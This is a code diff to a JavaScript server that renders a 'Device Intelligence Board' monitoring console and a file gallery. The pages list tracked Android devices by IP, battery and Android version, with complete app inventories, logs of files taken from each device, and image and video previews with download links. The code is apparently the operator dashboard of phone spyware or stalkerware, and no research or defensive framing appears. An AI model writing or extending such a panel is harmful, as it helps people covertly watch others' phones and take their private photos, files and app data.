@@ -275,49 +275,379 @@ function getGallerySignature(devices) {
 }
 
 function renderUsersPage(logs) {
-  const devices = logs.filter((entry) => entry.type === "device");
-  const unique = {};
+  const devices = logs
+    .filter((entry) => entry.type === "device")
+    .sort((a, b) => new Date(b.time || 0) - new Date(a.time || 0));
+  const files = logs
+    .filter((entry) => entry.type === "file")
+    .sort((a, b) => new Date(b.time || 0) - new Date(a.time || 0));
 
+  const latestByDevice = new Map();
   devices.forEach((device) => {
-    if (!device.ip || !device.model) return;
-    unique[`${device.ip}_${device.model}`] = device;
+    const id = device.device_id || createDeviceId(device.ip, device.brand, device.model);
+    if (!latestByDevice.has(id)) {
+      latestByDevice.set(id, {
+        ...device,
+        device_id: id,
+        file_logs: [],
+      });
+    }
   });
 
-  const list = Object.values(unique).reverse();
+  files.forEach((file) => {
+    const inferred =
+      file.device_id || createDeviceId(file.ip, file.device_brand, file.device_model);
+    let target = latestByDevice.get(inferred);
+    if (!target && file.ip) {
+      const matched = Array.from(latestByDevice.values()).find((device) => device.ip === file.ip);
+      if (matched) target = matched;
+    }
+    if (target) {
+      target.file_logs.push(file);
+    }
+  });
 
-  let html = '<html><body style="background:#111;color:#fff;font-family:sans-serif">';
-
-  list.forEach((device) => {
+  const deviceCards = Array.from(latestByDevice.values()).map((device) => {
     const apps = device.user_apps || device.apps || [];
     const system = device.system_apps || [];
+    const recentFiles = device.file_logs.slice(0, 12);
 
-    html += `
-    <div style="border:1px solid #333;padding:10px;margin:10px">
-      <b>${escapeHtml(device.brand || "")} ${escapeHtml(device.model || "")}</b><br>
-      IP: ${escapeHtml(device.ip || "")}<br>
-      Battery: ${escapeHtml(device.battery || "")}<br>
-      Apps: ${escapeHtml(device.app_count || apps.length)}<br>
+    return `
+      <section class="device-card">
+        <div class="device-head">
+          <div>
+            <p class="label">Endpoint</p>
+            <h2>${escapeHtml(createDeviceLabel(device))}</h2>
+            <p class="muted">
+              ${escapeHtml(device.ip || "unknown")} • Android ${escapeHtml(device.android || "-")} •
+              Last seen ${escapeHtml(formatDate(device.time))}
+            </p>
+          </div>
+          <div class="status-pill">ONLINE</div>
+        </div>
 
-      <h4>Apps</h4>
-      ${apps.map((appName) => `<div>${escapeHtml(appName)}</div>`).join("")}
+        <div class="stats">
+          <div class="stat"><strong>${escapeHtml(device.battery || "-")}%</strong><span>Battery</span></div>
+          <div class="stat"><strong>${apps.length}</strong><span>User Apps</span></div>
+          <div class="stat"><strong>${system.length}</strong><span>System Apps</span></div>
+          <div class="stat"><strong>${device.file_logs.length}</strong><span>Files Logged</span></div>
+        </div>
 
-      ${
-        system.length
-          ? `<h4>System Apps</h4>${system
-              .map((appName) => `<div>${escapeHtml(appName)}</div>`)
-              .join("")}`
-          : ""
-      }
-    </div>
+        <div class="grid-2">
+          <div class="panel">
+            <div class="panel-top">
+              <h3>Device Details</h3>
+            </div>
+            <div class="kv">
+              <span>Brand</span><strong>${escapeHtml(device.brand || "-")}</strong>
+              <span>Model</span><strong>${escapeHtml(device.model || "-")}</strong>
+              <span>IP</span><strong>${escapeHtml(device.ip || "-")}</strong>
+              <span>Android</span><strong>${escapeHtml(device.android || "-")}</strong>
+              <span>Total Apps</span><strong>${escapeHtml(device.app_count || apps.length + system.length)}</strong>
+              <span>Tracked At</span><strong>${escapeHtml(formatDate(device.time))}</strong>
+            </div>
+          </div>
+
+          <div class="panel">
+            <div class="panel-top">
+              <h3>Recent File Logs</h3>
+            </div>
+            ${
+              recentFiles.length
+                ? `<div class="log-list">
+                    ${recentFiles
+                      .map(
+                        (file) => `
+                        <div class="log-row">
+                          <div>
+                            <strong>${escapeHtml(file.original || file.file)}</strong>
+                            <small>${escapeHtml(file.folder || "unknown folder")}</small>
+                          </div>
+                          <div class="log-meta">
+                            <span>${escapeHtml(formatDate(file.time))}</span>
+                            <span>${escapeHtml(formatSize(file.size))}</span>
+                          </div>
+                        </div>
+                      `
+                      )
+                      .join("")}
+                  </div>`
+                : `<div class="empty-box">No file logs for this device yet.</div>`
+            }
+          </div>
+        </div>
+
+        <div class="grid-2">
+          <div class="panel">
+            <div class="panel-top">
+              <h3>User Apps</h3>
+              <span class="count-chip">${apps.length}</span>
+            </div>
+            ${
+              apps.length
+                ? `<div class="app-list">${apps
+                    .map((appName) => `<span>${escapeHtml(appName)}</span>`)
+                    .join("")}</div>`
+                : `<div class="empty-box">No user apps captured.</div>`
+            }
+          </div>
+
+          <div class="panel">
+            <div class="panel-top">
+              <h3>System Apps</h3>
+              <span class="count-chip">${system.length}</span>
+            </div>
+            ${
+              system.length
+                ? `<div class="app-list">${system
+                    .map((appName) => `<span>${escapeHtml(appName)}</span>`)
+                    .join("")}</div>`
+                : `<div class="empty-box">No system apps captured.</div>`
+            }
+          </div>
+        </div>
+      </section>
     `;
   });
 
-  html += "</body></html>";
-  return html;
+  return `
+  <!DOCTYPE html>
+  <html>
+    <head>
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width, initial-scale=1">
+      <title>Device Console</title>
+      <style>
+        :root {
+          --bg: #040705;
+          --panel: #0a110d;
+          --panel-2: #0d1711;
+          --line: rgba(104, 255, 168, 0.16);
+          --text: #e6fff0;
+          --muted: #8baa95;
+          --accent: #72ffb7;
+          --accent-2: #1dd17d;
+          --shadow: 0 24px 60px rgba(0, 0, 0, 0.45);
+        }
+
+        * { box-sizing: border-box; }
+        body {
+          margin: 0;
+          font-family: "Segoe UI", sans-serif;
+          color: var(--text);
+          background:
+            linear-gradient(180deg, rgba(114,255,183,0.05), transparent 22%),
+            repeating-linear-gradient(
+              0deg,
+              rgba(255,255,255,0.02) 0,
+              rgba(255,255,255,0.02) 1px,
+              transparent 1px,
+              transparent 28px
+            ),
+            #040705;
+        }
+
+        .wrap {
+          max-width: 1500px;
+          margin: 0 auto;
+          padding: 24px;
+        }
+
+        .hero, .device-card, .panel {
+          background: linear-gradient(180deg, rgba(14,22,17,0.95), rgba(8,13,10,0.95));
+          border: 1px solid var(--line);
+          box-shadow: var(--shadow);
+        }
+
+        .hero {
+          border-radius: 24px;
+          padding: 24px;
+          margin-bottom: 22px;
+        }
+
+        .hero h1 {
+          margin: 6px 0 8px;
+          font-size: 34px;
+          letter-spacing: 0.04em;
+          text-transform: uppercase;
+        }
+
+        .label, .muted, .log-row small {
+          color: var(--muted);
+        }
+
+        .overview {
+          display: grid;
+          grid-template-columns: repeat(4, minmax(0, 1fr));
+          gap: 14px;
+          margin-top: 18px;
+        }
+
+        .overview-card {
+          padding: 16px;
+          border-radius: 18px;
+          background: var(--panel-2);
+          border: 1px solid var(--line);
+        }
+
+        .overview-card strong {
+          display: block;
+          font-size: 28px;
+          margin-bottom: 6px;
+        }
+
+        .device-card {
+          border-radius: 24px;
+          padding: 22px;
+          margin-bottom: 22px;
+        }
+
+        .device-head, .panel-top, .log-row {
+          display: flex;
+          justify-content: space-between;
+          gap: 16px;
+          align-items: flex-start;
+        }
+
+        .device-head h2 {
+          margin: 6px 0 8px;
+          font-size: 30px;
+        }
+
+        .status-pill, .count-chip {
+          padding: 8px 12px;
+          border-radius: 999px;
+          border: 1px solid rgba(114,255,183,0.28);
+          color: var(--accent);
+          background: rgba(114,255,183,0.08);
+          font-size: 12px;
+          letter-spacing: 0.08em;
+          text-transform: uppercase;
+          white-space: nowrap;
+        }
+
+        .stats, .grid-2 {
+          display: grid;
+          gap: 14px;
+        }
+
+        .stats {
+          grid-template-columns: repeat(4, minmax(0, 1fr));
+          margin: 18px 0;
+        }
+
+        .grid-2 {
+          grid-template-columns: repeat(2, minmax(0, 1fr));
+          margin-top: 14px;
+        }
+
+        .stat, .panel {
+          padding: 16px;
+          border-radius: 18px;
+        }
+
+        .stat strong {
+          display: block;
+          font-size: 24px;
+          margin-bottom: 6px;
+        }
+
+        .kv {
+          display: grid;
+          grid-template-columns: 130px 1fr;
+          gap: 10px 14px;
+        }
+
+        .kv span {
+          color: var(--muted);
+        }
+
+        .log-list, .app-list {
+          display: grid;
+          gap: 10px;
+          margin-top: 14px;
+        }
+
+        .log-row {
+          padding: 12px 0;
+          border-bottom: 1px solid rgba(114,255,183,0.08);
+        }
+
+        .log-meta {
+          display: grid;
+          gap: 6px;
+          text-align: right;
+          color: var(--muted);
+        }
+
+        .app-list {
+          grid-template-columns: repeat(auto-fill, minmax(180px, 1fr));
+        }
+
+        .app-list span {
+          padding: 10px 12px;
+          border-radius: 12px;
+          background: rgba(255,255,255,0.03);
+          border: 1px solid rgba(114,255,183,0.09);
+          overflow: hidden;
+          text-overflow: ellipsis;
+        }
+
+        .empty-box {
+          margin-top: 14px;
+          padding: 18px;
+          border-radius: 14px;
+          color: var(--muted);
+          border: 1px dashed rgba(114,255,183,0.16);
+          background: rgba(255,255,255,0.02);
+        }
+
+        @media (max-width: 960px) {
+          .overview, .stats, .grid-2 {
+            grid-template-columns: 1fr 1fr;
+          }
+        }
+
+        @media (max-width: 720px) {
+          .overview, .stats, .grid-2, .app-list {
+            grid-template-columns: 1fr;
+          }
+
+          .device-head, .panel-top, .log-row {
+            flex-direction: column;
+          }
+
+          .log-meta {
+            text-align: left;
+          }
+
+          .kv {
+            grid-template-columns: 1fr;
+          }
+        }
+      </style>
+    </head>
+    <body>
+      <div class="wrap">
+        <section class="hero">
+          <p class="label">Monitoring Console</p>
+          <h1>Device Intelligence Board</h1>
+          <p class="muted">Tracked devices, full app inventory, and recent file movement logs.</p>
+          <div class="overview">
+            <div class="overview-card"><strong>${latestByDevice.size}</strong><span>Devices</span></div>
+            <div class="overview-card"><strong>${files.length}</strong><span>File Logs</span></div>
+            <div class="overview-card"><strong>${devices.length}</strong><span>Track Events</span></div>
+            <div class="overview-card"><strong>${files.filter((file) => getFileType(file.original || file.file) === "video").length}</strong><span>Video Logs</span></div>
+          </div>
+        </section>
+        ${deviceCards.join("") || '<div class="empty-box">No device data found.</div>'}
+      </div>
+    </body>
+  </html>
+  `;
 }
 
 function renderGalleryPage(devices) {
-  const totalFiles = devices.reduce((sum, device) => sum + device.files.length, 0);
   const totalFolders = devices.reduce((sum, device) => sum + device.folders.length, 0);
   const totalImages = devices.reduce(
     (sum, device) => sum + device.files.filter((file) => file.typeLabel === "image").length,
@@ -516,8 +846,14 @@ function renderGalleryPage(devices) {
           font-family: "Segoe UI", sans-serif;
           color: var(--text);
           background:
-            radial-gradient(circle at top left, rgba(53, 178, 103, 0.12), transparent 24%),
-            radial-gradient(circle at top right, rgba(55, 99, 78, 0.12), transparent 28%),
+            linear-gradient(180deg, rgba(109, 255, 177, 0.04), transparent 18%),
+            repeating-linear-gradient(
+              0deg,
+              rgba(255,255,255,0.018) 0,
+              rgba(255,255,255,0.018) 1px,
+              transparent 1px,
+              transparent 26px
+            ),
             linear-gradient(180deg, #030806 0%, #07110d 50%, #020504 100%);
           min-height: 100vh;
         }
@@ -556,11 +892,20 @@ function renderGalleryPage(devices) {
           padding: 24px;
         }
 
-        .live-pill {
+        .top-strip {
+          display: flex;
+          align-items: center;
+          justify-content: space-between;
+          gap: 10px;
+          margin-bottom: 16px;
+          flex-wrap: wrap;
+        }
+
+        .live-pill,
+        .sync-banner {
           display: inline-flex;
           align-items: center;
           gap: 10px;
-          margin-bottom: 16px;
           padding: 8px 12px;
           border-radius: 999px;
           border: 1px solid rgba(109, 255, 177, 0.22);
@@ -579,6 +924,24 @@ function renderGalleryPage(devices) {
           box-shadow: 0 0 12px rgba(109, 255, 177, 0.55);
         }
 
+        .sync-banner {
+          display: none;
+        }
+
+        .sync-banner.show {
+          display: inline-flex;
+        }
+
+        .sync-banner button {
+          border: 1px solid rgba(109,255,177,0.24);
+          background: rgba(109,255,177,0.08);
+          color: var(--accent);
+          border-radius: 999px;
+          padding: 6px 10px;
+          cursor: pointer;
+          font: inherit;
+        }
+
         .brand {
           margin-bottom: 22px;
         }
@@ -587,6 +950,7 @@ function renderGalleryPage(devices) {
           margin: 0 0 8px;
           font-size: 24px;
           letter-spacing: 0.03em;
+          text-transform: uppercase;
         }
 
         .brand p,
@@ -740,6 +1104,7 @@ function renderGalleryPage(devices) {
         .panel-top h2 {
           margin: 4px 0 8px;
           font-size: 34px;
+          text-transform: uppercase;
         }
 
         .device-stats {
@@ -783,6 +1148,12 @@ function renderGalleryPage(devices) {
           border-radius: 999px;
         }
 
+        .folder-link::before {
+          content: ">_";
+          color: var(--accent);
+          letter-spacing: 0.08em;
+        }
+
         .folder-section {
           margin-bottom: 28px;
           background: rgba(5, 11, 9, 0.72);
@@ -803,6 +1174,7 @@ function renderGalleryPage(devices) {
         .folder-header h3 {
           margin: 0 0 4px;
           font-size: 22px;
+          text-transform: uppercase;
         }
 
         .file-grid {
@@ -828,7 +1200,16 @@ function renderGalleryPage(devices) {
 
         .file-thumb {
           aspect-ratio: 4 / 3;
-          background: linear-gradient(135deg, rgba(20, 50, 36, 0.8), rgba(12, 30, 22, 0.95));
+          background:
+            linear-gradient(180deg, rgba(114,255,183,0.04), transparent),
+            repeating-linear-gradient(
+              0deg,
+              rgba(255,255,255,0.025) 0,
+              rgba(255,255,255,0.025) 1px,
+              transparent 1px,
+              transparent 22px
+            ),
+            linear-gradient(135deg, rgba(20, 50, 36, 0.8), rgba(12, 30, 22, 0.95));
           display: flex;
           align-items: center;
           justify-content: center;
@@ -970,27 +1351,6 @@ function renderGalleryPage(devices) {
           display: none !important;
         }
 
-        .sync-toast {
-          position: fixed;
-          right: 20px;
-          bottom: 20px;
-          padding: 12px 16px;
-          border-radius: 14px;
-          background: rgba(7, 15, 12, 0.95);
-          border: 1px solid rgba(109, 255, 177, 0.3);
-          color: var(--text);
-          box-shadow: var(--shadow);
-          opacity: 0;
-          transform: translateY(8px);
-          transition: opacity 0.2s ease, transform 0.2s ease;
-          pointer-events: none;
-        }
-
-        .sync-toast.show {
-          opacity: 1;
-          transform: translateY(0);
-        }
-
         @media (max-width: 1200px) {
           .app-shell {
             grid-template-columns: 240px minmax(0, 1fr);
@@ -1037,9 +1397,15 @@ function renderGalleryPage(devices) {
         </aside>
 
         <main class="main" id="galleryRoot">
-          <div class="live-pill">
-            <span class="live-dot"></span>
-            <span>Live Sync Active</span>
+          <div class="top-strip">
+            <div class="live-pill">
+              <span class="live-dot"></span>
+              <span>Passive Live Monitor</span>
+            </div>
+            <div class="sync-banner" id="syncBanner">
+              <span>New uploads available</span>
+              <button type="button" id="refreshNowBtn">Refresh Now</button>
+            </div>
           </div>
 
           <section class="stats-bar">
@@ -1112,10 +1478,8 @@ function renderGalleryPage(devices) {
         const previewOpen = document.getElementById("previewOpen");
         const previewDownload = document.getElementById("previewDownload");
 
-        const syncToast = document.createElement("div");
-        syncToast.className = "sync-toast";
-        syncToast.textContent = "New files detected. Syncing view...";
-        document.body.appendChild(syncToast);
+        const syncBanner = document.getElementById("syncBanner");
+        const refreshNowBtn = document.getElementById("refreshNowBtn");
 
         const state = {
           filter: sessionStorage.getItem("gallery-filter") || "all",
@@ -1288,12 +1652,15 @@ function renderGalleryPage(devices) {
               if (!response.ok) return;
               const data = await response.json();
               if (data.signature && data.signature !== GALLERY_SIGNATURE) {
-                syncToast.classList.add("show");
-                window.setTimeout(() => window.location.reload(), 1200);
+                syncBanner.classList.add("show");
               }
             } catch {}
           }, 5000);
         }
+
+        refreshNowBtn.addEventListener("click", () => {
+          window.location.reload();
+        });
 
         const defaultDevice =
           state.activeDevice &&
